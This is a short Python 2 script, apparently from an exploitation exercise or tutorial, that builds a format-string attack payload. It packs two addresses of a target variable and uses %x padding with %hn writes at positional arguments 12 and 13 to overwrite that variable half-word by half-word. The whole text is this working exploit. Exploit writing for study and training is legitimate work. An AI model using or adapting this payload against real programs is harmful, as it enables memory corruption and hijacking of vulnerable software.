import struct;
# address of the target variable
tlow = struct.pack('I', 0x8049810)
# address of the high-order half-word of target variable
thi = struct.pack('I', 0x8049812)
# The padding count always takes into account the amount of bytes
# written beforehand.
print thi + tlow + '%250x' + '%12$hn' + '%21570x' + '%13$hn'
